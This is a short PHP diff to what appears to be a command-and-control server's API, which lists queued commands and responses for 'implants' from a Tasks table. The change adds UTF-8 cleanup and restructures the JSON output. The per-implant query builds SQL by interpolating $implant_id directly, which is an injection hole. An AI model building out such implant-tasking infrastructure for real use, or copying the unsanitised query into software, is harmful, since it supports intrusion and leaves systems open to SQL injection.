@@ -13,6 +13,22 @@ if ($parts[1] != "api") {
     die();
 }
 
+
+// Function to recursively convert all strings to valid UTF-8
+function utf8ize($data) {
+    if (is_array($data)) {
+        foreach ($data as $k => $v) {
+            $data[$k] = utf8ize($v);
+        }
+        return $data;
+    } elseif (is_string($data)) {
+        return mb_convert_encoding($data, 'UTF-8', 'UTF-8'); // removes invalid sequences
+    } else {
+        return $data;
+    }
+}
+
+
 function main() {
     global $parts, $pdo;
 
@@ -30,13 +46,21 @@ function main() {
                     if ($implant_id == null) {
                         $stmt = $pdo->query("SELECT * FROM Tasks");
                         $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
+                        $json = utf8ize($results);
+                        $json = json_encode($json, JSON_UNESCAPED_UNICODE | JSON_PARTIAL_OUTPUT_ON_ERROR);
+                        if ($json === false) {
+                                echo "json_encode() failed: ".json_last_error_msg();
+                                var_dump(json_last_error());
+                        } else {
+                                echo $json;
+                        }
+                        break;
+                    } else {
+                        $stmt = $pdo->query("SELECT task_id, command, response, status FROM Tasks WHERE implant_id = '$implant_id'");
+                        $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
                         echo json_encode($results);
                         break;
                     }
-                    $stmt = $pdo->query("SELECT task_id, command, response, status FROM Tasks WHERE implant_id = '$implant_id'");
-                    $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
-                    echo json_encode($results);
-                    break;
                 default;
                 http_response_code(404);
                 die();
